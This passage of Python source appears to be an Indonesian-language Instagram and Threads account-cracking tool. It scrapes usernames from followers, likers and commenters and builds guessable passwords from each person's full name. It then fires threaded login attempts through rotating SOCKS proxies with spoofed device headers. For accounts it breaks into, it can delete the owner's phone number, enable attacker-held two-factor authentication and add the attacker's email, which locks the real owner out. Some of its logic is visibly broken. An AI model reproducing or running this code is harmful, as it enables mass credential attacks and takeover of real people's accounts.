                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
